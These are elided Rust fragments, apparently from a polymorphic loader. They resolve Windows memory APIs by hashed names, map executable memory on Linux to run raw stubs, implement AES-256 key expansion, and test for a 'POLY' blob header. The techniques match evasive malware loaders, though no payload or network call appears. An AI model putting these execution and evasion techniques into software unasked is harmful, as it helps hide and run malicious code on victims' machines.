...
fn poly_exec_raw_stub_windows(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
    ...
    static FN_VIRTUAL_FREE: std::sync::OnceLock<Option<FnVirtualFree>> = std::sync::OnceLock::new();
    ...
    let virtual_alloc = *FN_VIRTUAL_ALLOC.get_or_init(|| unsafe {
        ...
        let addr =
            pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"VirtualAlloc"))?;
        Some(std::mem::transmute::<usize, FnVirtualAlloc>(addr))
    });

    let virtual_free = *FN_VIRTUAL_FREE.get_or_init(|| unsafe {
        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
        let addr = pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"VirtualFree"))?;
...
fn poly_exec_raw_stub_linux(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
    use libc::{
        mmap, mprotect, munmap, MAP_ANONYMOUS, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE,
    };
    ...
    unsafe {
        let f: extern "C" fn(*const u8, usize, *const u8, *mut u8) = std::mem::transmute(stub_page);
...
fn aes256_ctr_xor(data: &[u8], key_material: &[u8]) -> Vec<u8> {
    ...
    for i in 8..60 {
        let mut t = w[i - 1];
        if i % 8 == 0 {
            t = sub_word(t.rotate_left(8)) ^ ((RCON[i / 8] as u32) << 24);
        } else if i % 8 == 4 {
            t = sub_word(t);
        }
        w[i] = w[i - 8] ^ t;
...
mod tests {
    ...
    fn is_poly_blob_detects_legacy_magic() {
        ...
        assert!(is_poly_blob(
            b"POLY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        ));
